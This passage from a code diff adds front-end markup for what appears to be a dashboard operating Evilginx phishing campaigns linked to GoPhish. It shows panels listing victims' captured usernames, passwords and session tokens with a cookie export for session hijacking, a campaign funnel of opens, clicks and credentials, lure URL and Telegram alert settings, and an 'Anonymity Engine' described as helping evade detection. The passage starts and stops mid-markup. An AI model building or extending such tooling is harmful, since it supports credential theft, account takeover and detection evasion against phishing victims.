+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Location</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Time</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider"></th>
+                            </tr>
+                        </thead>
+                        <tbody class="bg-gray-800 divide-y divide-gray-700">
+                            <template x-for="event in filteredEvents().slice(0, 20)" :key="event.id">
+                                <tr class="hover:bg-gray-750 transition-colors">
+                                    <td class="px-6 py-4 whitespace-nowrap" x-show="eventCols.event">
+                                        <div class="flex items-center">
+                                            <span class="text-lg mr-2" x-text="icon(event)"></span>
+                                            <span class="text-sm font-medium text-white" x-text="event.type.toUpperCase()"></span>
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-show="eventCols.target" x-text="event.username || event.ip"></td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" x-show="eventCols.location" x-text="event.geo ? event.geo.country : 'Unknown'"></td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 font-mono" x-show="eventCols.time" x-text="formatTime(event.timestamp)"></td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-blue-400">
+                                        <button type="button" @click="viewDetails(event)" title="View event details" class="text-xs hover:underline">Details</button>
+                                        <button type="button" @click="copyTokens(JSON.stringify(event, null, 2))" title="Copy event as JSON" class="text-xs text-gray-400 hover:text-gray-200 ml-2">Copy JSON</button>
+                                    </td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Visitors View -->
+        <div x-show="tab === 'visitors'" x-cloak>
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                    <h3 class="text-lg font-medium text-white">All Visitors</h3>
+                    <button type="button" @click="loadVisitors()" title="Refresh visitors list" class="text-sm text-blue-400 hover:text-blue-300">Refresh</button>
+                </div>
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-900">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Time</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">IP Address</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Location</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Phishlet</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Campaign</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody class="bg-gray-800 divide-y divide-gray-700">
+                        <template x-for="v in visitorData" :key="v.id">
+                            <tr class="hover:bg-gray-750">
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="formatTime(v.timestamp)"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-blue-400" x-text="v.ip"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="v.geo ? (v.geo.city + ', ' + v.geo.country) : 'Unknown'"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="v.phishlet"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                                    <span x-show="v.rid" class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full bg-indigo-900 text-indigo-200"
+                                          x-text="v.rid" title="GoPhish Recipient ID"></span>
+                                    <span x-show="!v.rid" class="text-gray-500">-</span>
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full"
+                                          :class="v.event.includes('Opened') ? 'bg-blue-900 text-blue-200' : 'bg-green-900 text-green-200'"
+                                          x-text="v.event"></span>
+                                </td>
+                            </tr>
+                        </template>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Bots View -->
+        <div x-show="tab === 'bots'" x-cloak>
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                    <h3 class="text-lg font-medium text-white">Bots / Blocked Requests</h3>
+                    <div class="text-sm text-gray-400">Latest detections</div>
+                </div>
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-900">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Time</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">IP</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Phishlet</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Message</th>
+                        </tr>
+                    </thead>
+                    <tbody class="bg-gray-800 divide-y divide-gray-700">
+                        <template x-for="b in botEvents().slice(0,50)" :key="b.id">
+                            <tr class="hover:bg-gray-750">
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="formatTime(b.timestamp)"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-red-400" x-text="b.ip"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="b.phishlet || 'n/a'"></td>
+                                <td class="px-6 py-4 whitespace-normal text-sm text-gray-400" x-text="b.message || 'Blocked request'"></td>
+                            </tr>
+                        </template>
+                        <tr x-show="botEvents().length === 0">
+                            <td colspan="4" class="px-6 py-10 text-center text-gray-500">No bot or blocked traffic detected yet.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Credentials View -->
+        <div x-show="tab === 'credentials'" x-cloak>
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden mb-4">
+                <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                    <h3 class="text-lg font-medium text-white">Captured Credentials</h3>
+                    <button type="button" @click="loadCredentials()" title="Refresh credentials list" class="text-sm text-blue-400 hover:text-blue-300">Refresh</button>
+                </div>
+            </div>
+            <div class="grid grid-cols-1 gap-4">
+                <div x-show="credentialData.length === 0" class="bg-gray-800 rounded-lg border border-gray-700 p-8 text-center">
+                    <div class="text-gray-500 text-sm">No credentials captured yet</div>
+                    <div class="text-gray-600 text-xs mt-2">Credentials will appear here when victims submit login forms</div>
+                </div>
+                <template x-for="c in credentialData" :key="c.id">
+                    <div class="bg-gray-800 rounded-lg border border-gray-700 p-4">
+                        <div class="flex justify-between items-start mb-4">
+                            <div>
+                                <h3 class="text-lg font-bold text-white" x-text="c.username || c.phishlet + ' session'"></h3>
+                                <p class="text-sm text-gray-400" x-text="c.phishlet + ' • ' + formatTime(c.timestamp)"></p>
+                                <span class="inline-block mt-1 px-2 py-0.5 text-xs rounded"
+                                    :class="c.type === 'credentials' ? 'bg-green-600 text-white' : 'bg-purple-600 text-white'"
+                                    x-text="c.type === 'credentials' ? 'Credentials' : 'Session'"></span>
+                                <!-- Campaign RID badge -->
+                                <span x-show="c.rid" class="inline-block ml-2 mt-1 px-2 py-0.5 text-xs rounded bg-indigo-600 text-white"
+                                    x-text="'Campaign: ' + c.rid" title="GoPhish Recipient ID"></span>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-sm font-mono text-blue-400" x-text="c.ip"></div>
+                                <div class="text-xs text-gray-500" x-text="c.geo ? (c.geo.city ? c.geo.city + ', ' : '') + c.geo.country : ''"></div>
+                                <!-- Show RID in smaller text if present -->
+                                <div x-show="c.rid" class="text-[10px] text-indigo-400 font-mono" x-text="'RID: ' + c.rid"></div>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="bg-black/30 p-3 rounded border border-gray-600">
+                                <div class="text-xs text-gray-500 uppercase mb-1">Username</div>
+                                <div class="font-mono text-green-400 break-all" x-text="c.username || '(not captured)'"></div>
+                            </div>
+                            <div class="bg-black/30 p-3 rounded border border-gray-600">
+                                <div class="text-xs text-gray-500 uppercase mb-1">Password</div>
+                                <div class="font-mono text-yellow-400 break-all" x-text="c.password || '(not captured)'"></div>
+                            </div>
+                        </div>
+                        <div class="mt-4" x-show="c.tokens && c.tokens.length > 2">
+                            <div class="bg-black/30 p-3 rounded border border-gray-600">
+                                <div class="flex justify-between items-center mb-1">
+                                    <div class="text-xs text-gray-500 uppercase">Session Tokens</div>
+                                    <div class="space-x-2">
+                                        <button type="button" @click="copyTokens(c.tokens)" title="Copy tokens to clipboard" class="text-xs text-blue-400 hover:text-blue-300">Copy</button>
+                                        <button type="button" @click="exportCookies(c.tokens, c.username || c.phishlet)" title="Export cookies as JSON file (Cookie-Editor compatible)" class="text-xs text-green-400 hover:text-green-300">Export</button>
+                                        <button type="button" @click="openTokenViewer(c.tokens, c.username || c.phishlet)" title="View tokens in viewer" class="text-xs text-purple-300 hover:text-purple-200">View</button>
+                                    </div>
+                                </div>
+                                <div class="font-mono text-xs text-gray-400 truncate" x-text="c.tokens ? c.tokens.substring(0, 80) + '...' : ''"></div>
+                            </div>
+                        </div>
+                    </div>
+                </template>
+            </div>
+            <div class="bg-gray-800 rounded-lg border border-gray-700 p-4 mt-4">
+                <div class="flex items-center justify-between mb-3">
+                    <div>
+                        <h3 class="text-sm font-semibold text-white uppercase tracking-wider">Token Viewer</h3>
+                        <p class="text-xs text-gray-500" x-text="tokenView.label"></p>
+                    </div>
+                    <span class="text-xs text-gray-400">Cookies: <span x-text="tokenView.cookies.length"></span> • Pairs: <span x-text="tokenView.pairs.length"></span></span>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="bg-black/20 border border-gray-700 rounded p-3">
+                        <div class="text-xs text-gray-500 uppercase mb-2">Cookie Tokens</div>
+                        <div x-show="tokenView.cookies.length === 0" class="text-xs text-gray-500">Select a record with tokens to inspect cookies.</div>
+                        <div class="space-y-2 max-h-56 overflow-y-auto">
+                            <template x-for="c in tokenView.cookies" :key="c.name + c.domain">
+                                <div class="p-2 rounded bg-gray-900 border border-gray-700">
+                                    <div class="text-sm text-white font-mono" x-text="c.name + '=' + c.value"></div>
+                                    <div class="text-[10px] text-gray-500" x-text="(c.domain || '') + c.path"></div>
+                                    <div class="text-[10px] text-gray-500" x-text="c.httpOnly ? 'HttpOnly' : ''"></div>
+                                </div>
+                            </template>
+                        </div>
+                    </div>
+                    <div class="bg-black/20 border border-gray-700 rounded p-3">
+                        <div class="text-xs text-gray-500 uppercase mb-2">Other Tokens</div>
+                        <div x-show="tokenView.pairs.length === 0" class="text-xs text-gray-500">Key/value tokens will appear here.</div>
+                        <div class="space-y-2 max-h-56 overflow-y-auto">
+                            <template x-for="p in tokenView.pairs" :key="p.key">
+                                <div class="p-2 rounded bg-gray-900 border border-gray-700">
+                                    <div class="text-[11px] text-gray-400 uppercase" x-text="p.key"></div>
+                                    <div class="text-sm text-white font-mono break-all" x-text="p.value"></div>
+                                </div>
+                            </template>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-3">
+                    <div class="text-xs text-gray-500 uppercase mb-1">Raw</div>
+                    <pre class="bg-gray-900 border border-gray-800 rounded p-3 text-[11px] text-gray-300 whitespace-pre-wrap break-all" x-text="tokenView.raw || 'No token selected'"></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Campaigns View -->
+        <div x-show="tab === 'campaigns'" x-cloak>
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Opens</div>
+                    <div class="text-2xl font-bold text-white" x-text="funnelStats().counts.open"></div>
+                    <div class="mt-1 h-1.5 bg-gray-700 rounded">
+                        <div class="h-1.5 bg-blue-500 rounded" :style="`width:${funnelStats().pctOpen}%`"></div>
+                    </div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Clicks</div>
+                    <div class="text-2xl font-bold text-white" x-text="funnelStats().counts.click"></div>
+                    <div class="mt-1 h-1.5 bg-gray-700 rounded">
+                        <div class="h-1.5 bg-indigo-500 rounded" :style="`width:${funnelStats().pctClick}%`"></div>
+                    </div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Credentials</div>
+                    <div class="text-2xl font-bold text-white" x-text="funnelStats().counts.credentials"></div>
+                    <div class="mt-1 h-1.5 bg-gray-700 rounded">
+                        <div class="h-1.5 bg-yellow-500 rounded" :style="`width:${funnelStats().pctCreds}%`"></div>
+                    </div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Sessions</div>
+                    <div class="text-2xl font-bold text-white" x-text="funnelStats().counts.session"></div>
+                    <div class="mt-1 h-1.5 bg-gray-700 rounded">
+                        <div class="h-1.5 bg-purple-500 rounded" :style="`width:${funnelStats().pctSession}%`"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                    <h3 class="text-lg font-medium text-white">GoPhish Campaigns</h3>
+                    <button type="button" @click="loadCampaigns()" title="Refresh campaigns list" class="text-sm text-blue-400 hover:text-blue-300">Refresh</button>
+                </div>
+                <table class="min-w-full divide-y divide-gray-700">
+                    <thead class="bg-gray-900">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">ID</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Name</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Status</th>
+                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Created</th>
+                            <th class="px-6 py-3"></th>
+                        </tr>
+                    </thead>
+                    <tbody class="bg-gray-800 divide-y divide-gray-700">
+                        <template x-for="camp in campaignData" :key="camp.id">
+                            <tr class="hover:bg-gray-750">
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" x-text="camp.id"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-white" x-text="camp.name"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm">
+                                    <span class="px-2 inline-flex text-xs leading-5 font-semibold rounded-full" 
+                                          :class="camp.status === 'Completed' ? 'bg-green-900 text-green-200' : 'bg-yellow-900 text-yellow-200'"
+                                          x-text="camp.status"></span>
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" x-text="new Date(camp.created_date).toLocaleDateString()"></td>
+                                <td class="px-6 py-4 whitespace-nowrap text-sm text-blue-400">
+                                    <button type="button" @click="openCampaign(camp)" title="View campaign details" class="text-xs hover:underline">View</button>
+                                </td>
+                            </tr>
+                        </template>
+                        <tr x-show="campaignData.length === 0">
+                            <td colspan="5" class="px-6 py-10 text-center text-gray-500">No campaigns found or database not accessible.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Settings View -->
+        <div x-show="tab === 'settings'" x-cloak>
+            <div class="space-y-6 max-w-4xl">
+                <!-- Notification Controls -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <h3 class="text-lg font-medium text-white mb-4">Notification Controls</h3>
+                    <div class="grid grid-cols-2 md:grid-cols-3 gap-3 text-sm text-gray-200">
+                        <label class="flex items-center gap-2"><input type="checkbox" x-model="notifyPrefs.session"> Sessions</label>
+                        <label class="flex items-center gap-2"><input type="checkbox" x-model="notifyPrefs.credentials"> Credentials</label>
+                        <label class="flex items-center gap-2"><input type="checkbox" x-model="notifyPrefs.click"> Clicks</label>
+                        <label class="flex items-center gap-2"><input type="checkbox" x-model="notifyPrefs.open"> Opens</label>
+                        <label class="flex items-center gap-2"><input type="checkbox" x-model="notifyPrefs.bot"> Bot/Blocked</label>
+                    </div>
+                    <div class="mt-4 flex items-center gap-2 text-sm text-gray-300">
+                        <span>Do Not Disturb:</span>
+                        <button type="button" @click="setDnd(15)" title="Do not disturb for 15 minutes" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded">15m</button>
+                        <button type="button" @click="setDnd(60)" title="Do not disturb for 1 hour" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded">1h</button>
+                        <button type="button" @click="setDnd(0)" title="Clear do not disturb" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded">Clear</button>
+                        <span class="text-xs text-gray-500" x-text="dndUntil ? ('Until ' + new Date(dndUntil).toLocaleTimeString()) : 'Off'"></span>
+                    </div>
+                </div>
+                
+                <!-- Lure URL -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <h3 class="text-lg font-medium text-white mb-4">Active Lure URL</h3>
+                    <div class="flex gap-2">
+                        <input type="text" readonly :value="settings.lure_url" class="flex-1 bg-gray-900 border border-gray-600 rounded px-3 py-2 text-gray-300 font-mono text-sm">
+                        <button type="button" @click="copyTokens(settings.lure_url)" title="Copy lure URL to clipboard" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded">Copy</button>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2">Use <code>lures expose <id></code> in Evilginx terminal to update this.</p>
+                </div>
+
+                <!-- Telegram Config -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white">Telegram Configuration</h3>
+                        <!-- Sync Status Indicator -->
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Server Sync:</span>
+                            <span x-show="telegramSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="telegramSyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="telegramSyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="telegramSyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="telegramSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Server Offline
+                            </span>
+                            <button type="button" @click="syncTelegramFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Server">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Bot Token</label>
+                            <input type="text" x-model="settings.telegram_bot_token" placeholder="123456:ABC-DEF..." class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Chat ID</label>
+                            <input type="text" x-model="settings.telegram_chat_id" placeholder="-100123456789" class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-4">
+                                <div class="flex items-center gap-2">
+                                    <span class="text-sm text-gray-400">Status:</span>
+                                    <span x-show="settings.telegram_enabled" class="text-green-400 text-sm font-medium">● Enabled</span>
+                                    <span x-show="!settings.telegram_enabled" class="text-red-400 text-sm font-medium">○ Disabled</span>
+                                </div>
+                                <label class="flex items-center gap-2 cursor-pointer">
+                                    <input type="checkbox" x-model="settings.telegram_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-blue-500 focus:ring-blue-500">
+                                    <span class="text-sm text-gray-400">Enable Telegram</span>
+                                </label>
+                            </div>
+                            <div class="flex gap-2">
+                                <button type="button" @click="syncTelegramToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Server">
+                                    Push to Server
+                                </button>
+                                <button type="button" @click="saveSettings" title="Save Telegram settings" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm">Save Configuration</button>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-500">Configure Telegram alerts for real-time notifications. Use "Push to Server" to sync your config.</p>
+                    </div>
+                </div>
+
+                <!-- Turnstile Config -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white">Cloudflare Turnstile Configuration</h3>
+                        <!-- Sync Status Indicator -->
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Server Sync:</span>
+                            <span x-show="turnstileSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="turnstileSyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="turnstileSyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="turnstileSyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="turnstileSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Server Offline
+                            </span>
+                            <button type="button" @click="syncTurnstileFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Server">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Site Key</label>
+                            <input type="text" x-model="settings.turnstile_sitekey" placeholder="0x4AAAAAAA..." class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-400 mb-1">Secret Key</label>
+                            <input type="password" x-model="settings.turnstile_secretkey" placeholder="0x4AAAAAAA..." class="w-full bg-gray-900 border border-gray-600 rounded px-3 py-2 text-white focus:border-blue-500 focus:outline-none">
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-4">
+                                <div class="flex items-center gap-2">
+                                    <span class="text-sm text-gray-400">Status:</span>
+                                    <span x-show="settings.turnstile_enabled" class="text-green-400 text-sm font-medium">● Enabled</span>
+                                    <span x-show="!settings.turnstile_enabled" class="text-red-400 text-sm font-medium">○ Disabled</span>
+                                </div>
+                                <label class="flex items-center gap-2 cursor-pointer">
+                                    <input type="checkbox" x-model="settings.turnstile_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-blue-500 focus:ring-blue-500">
+                                    <span class="text-sm text-gray-400">Enable Turnstile</span>
+                                </label>
+                            </div>
+                            <div class="flex gap-2">
+                                <button type="button" @click="syncTurnstileToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Server">
+                                    Push to Server
+                                </button>
+                                <button type="button" @click="saveSettings" title="Save Turnstile settings" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm">Save Configuration</button>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-500">Get your Turnstile keys from <a href="https://dash.cloudflare.com/?to=/:account/turnstile" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline">Cloudflare Dashboard</a>. When enabled, all lures will show a CAPTCHA challenge. Use "Push to Server" to sync your config.</p>
+                    </div>
+                </div>
+
+                <!-- Anonymity Engine Config -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white">🕵️ Anonymity Engine</h3>
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Evilginx Sync:</span>
+                            <span x-show="anonymitySyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="anonymitySyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="anonymitySyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="anonymitySyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="anonymitySyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Evilginx Offline
+                            </span>
+                            <button type="button" @click="syncAnonymityFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Evilginx">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <p class="text-sm text-gray-400">Anonymity features help evade detection by randomizing headers and rotating user agents.</p>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <label class="flex items-center gap-3 p-3 bg-gray-900 rounded border border-gray-700 cursor-pointer hover:border-gray-600">
+                                <input type="checkbox" x-model="settings.anonymity_enabled" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-green-500 focus:ring-green-500">
+                                <div>
+                                    <div class="text-sm text-white font-medium">Enable Engine</div>
+                                    <div class="text-xs text-gray-500">Master switch</div>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-3 p-3 bg-gray-900 rounded border border-gray-700 cursor-pointer hover:border-gray-600">
+                                <input type="checkbox" x-model="settings.anonymity_header_randomization" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-blue-500 focus:ring-blue-500">
+                                <div>
+                                    <div class="text-sm text-white font-medium">Header Randomization</div>
+                                    <div class="text-xs text-gray-500">Randomize HTTP headers</div>
+                                </div>
+                            </label>
+                            <label class="flex items-center gap-3 p-3 bg-gray-900 rounded border border-gray-700 cursor-pointer hover:border-gray-600">
+                                <input type="checkbox" x-model="settings.anonymity_useragent_rotation" class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-purple-500 focus:ring-purple-500">
+                                <div>
+                                    <div class="text-sm text-white font-medium">User-Agent Rotation</div>
+                                    <div class="text-xs text-gray-500">Rotate user agents</div>
+                                </div>
+                            </label>
+                        </div>
+                        <div class="flex justify-end gap-2">
+                            <button type="button" @click="syncAnonymityToEvilginx()" class="bg-purple-600 hover:bg-purple-500 text-white px-3 py-2 rounded text-sm" title="Push config to Evilginx">
+                                Push to Evilginx
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Cloudflare DNS Config (for wildcard certs) -->
+                <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h3 class="text-lg font-medium text-white">☁️ Cloudflare DNS (Wildcard Certs)</h3>
+                        <div class="flex items-center gap-2">
+                            <span class="text-xs text-gray-500">Evilginx Sync:</span>
+                            <span x-show="cloudflareSyncStatus === 'synced'" class="flex items-center gap-1 text-xs text-green-400">
+                                <span class="w-2 h-2 bg-green-400 rounded-full"></span> Synced
+                            </span>
+                            <span x-show="cloudflareSyncStatus === 'syncing'" class="flex items-center gap-1 text-xs text-yellow-400">
+                                <span class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></span> Syncing...
+                            </span>
+                            <span x-show="cloudflareSyncStatus === 'error'" class="flex items-center gap-1 text-xs text-red-400" :title="cloudflareSyncError">
+                                <span class="w-2 h-2 bg-red-400 rounded-full"></span> Error
+                            </span>
+                            <span x-show="cloudflareSyncStatus === 'offline'" class="flex items-center gap-1 text-xs text-gray-500">
+                                <span class="w-2 h-2 bg-gray-500 rounded-full"></span> Evilginx Offline
+                            </span>
+                            <button type="button" @click="syncCloudflareFromEvilginx()" class="ml-2 text-xs text-blue-400 hover:text-blue-300" title="Pull config from Evilginx">
+                                <svg class="w-4 h-4 inline" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
